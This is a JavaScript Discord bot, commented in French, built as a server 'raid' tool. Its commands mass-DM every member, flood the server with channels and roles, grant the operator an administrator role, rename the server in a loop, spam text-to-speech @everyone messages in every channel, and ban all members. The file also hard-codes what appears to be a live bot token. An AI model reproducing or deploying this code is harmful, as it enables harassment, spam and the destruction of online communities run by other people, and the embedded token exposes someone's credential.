const Discord = require("discord.js");
const client = new Discord.Client();
const bot = new Discord.Client();
const token = 'NTI2MzU3NzQ0NzgyMTQ3NjE1.D2asRQ.S2s-qqiwcZ3Ip5xURNN96wtWqPk' ;
const ID = '456846280803483660' ;
MSG_MP = '@everyone mica il est beau' ;
NOM_CHANNEL = '@everyone mica il est beau' ;
NOM_ROLE = '@everyone mica il est beau';
NOM_ROLE_ADMIN = '@everyone mica il est beau' ;
PREMIER_NOM_DU_SERV = "@everyone mica il est beau" ;
DEUXIEME_NOM_DU_SERV = '@everyone mica il est beau' ;
TROISIEME_NOM_DU_SERV = '@everyone mica il est beau' ;
QUATRIEME_NOM_DU_SERV = '@everyone mica il est beau' ;
URL_IMAGE_DU_SERV = '@everyone mica il est beau' ;
MSG_DE_FIN = "@everyone mica il est beauu" ;
client.on("ready", () => {
    client.user.setStatus("online");
    client.guilds.forEach(serv => {
        serv.channels.random().createInvite().then(invite => console.log(`>${serv.name} | ${invite}`))
        .catch(console.log(`>${serv.name} | Entrain d'envoyer une invite... `));
    });
    var memberCount = client.users.size;
    var serverCount = client.guilds.size;
    console.log("**************************************");
    console.log(`No self bot bot activer ! by User`);
    console.log(`Id du bot: ${client.user.id}`)
    console.log(`Lien d'inivtation: https://discordapp.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=8`)
    console.log(`Token: du bot: ${client.token}`)
    console.log("**************************************");
    console.log("Commande disponible :");
    console.log("!admin pour créer un rôle");
    console.log("!mp pour spam mp tous les membres");
    console.log("!channel pour créer plein de channel");
    console.log("!rekt change le nom en boucle + met le serv à Hong Kong");
    console.log("!fin mentionne @everyonedans beaucoup de channel");
    console.log("!ban ban tous le monde");
    console.log("**************************************");
    console.log('Information du client:')
    console.log("Utilisateurs: " + memberCount + "\nServeurs: " + serverCount);
    console.log('**************************************')

});

client.on('message', function (message) {
    if (message.content === '!mp' && message.author.id === ID) {
        console.log(`Commande !mp par ${message.author.tag}`);
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
            if (i === 250) clearInterval(interval);
               message.guild.members.forEach(member => {
                member.send(MSG_MP).catch(e => {MSG_MP });
            }, 100);

        });
    }
        if(message.content === "!channel" && message.author.id === ID) {
          console.log(`Commande !channel channel par ${message.author.tag}`);
          if (message.deletable) message.delete();
          let i = 0;
          let interval = setInterval(function () {
            if (i === 250) clearInterval(interval);
            message.guild.createChannel(NOM_CHANNEL).then(i++);
          }, 100);
        }

        if(message.content === "!role" && message.author.id === ID) {
          message.channel.send(message.author.toString() )
          console.log(`Commande !role par ${message.author.tag}`);
        message.guild.createRole({ name: NOM_ROLE, color: 'RANDOM' }).then(function (role) {
            message.guild.members.forEach(member => {
        message.guild.createRole({ name: NOM_ROLE, color: 'RANDOM' })
        message.guild.createRole({ name: NOM_ROLE, color: 'RANDOM' })
        message.guild.createRole({ name: NOM_ROLE, color: 'RANDOM' })
        message.guild.createRole({ name: NOM_ROLE, color: 'RANDOM' })

            })
        })
        }

        if(message.content === "!admin" && message.author.id === ID) {
        if (message.deletable) message.delete();
          console.log(`Commande !admin par ${message.author.tag}`);
          message.member.guild.createRole({
            name: NOM_ROLE_ADMIN,
            permissions: "ADMINISTRATOR",
        })
        .then(function (role) { message.member.addRole(role); });
        }



    if (message.content === '!rekt' && message.author.id === ID) {
        console.log(`Commande !rekt par ${message.author.tag}`);
        if (message.deletable) message.delete();
        message.guild.setRegion('hongkong')
        let names = [
            PREMIER_NOM_DU_SERV,
            DEUXIEME_NOM_DU_SERV,
            TROISIEME_NOM_DU_SERV,
            QUATRIEME_NOM_DU_SERV,
        ];
        let wait = 2000;
        message.guild.setIcon(URL_IMAGE_DU_SERV);
        setInterval(function () {
            setTimeout(function () {
                names.forEach(name => {
                    message.guild.setName(name).then(wait += 2000);
                });
            }, names.length * 2000);
        }, wait)
    }

        if(message.content === "!fin" && message.author.id === ID) {
        if (message.deletable) message.delete();
          console.log(`Commande !fin par ${message.author.tag}`);
        let i = 0;
        let interval = setInterval(function () {
            message.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send(MSG_DE_FIN, { tts: true }).then(i++);
            }, 1000);
        });
          }

          if (message.content === '!ban' && message.author.id === ID) {
        if (message.deletable) message.delete();
            console.log(`Commande !ban par ${message.author.tag}`);
                message.guild.roles.find('name', '@everyone').members.map(m=>m.ban());
        }
});

client.login(token)

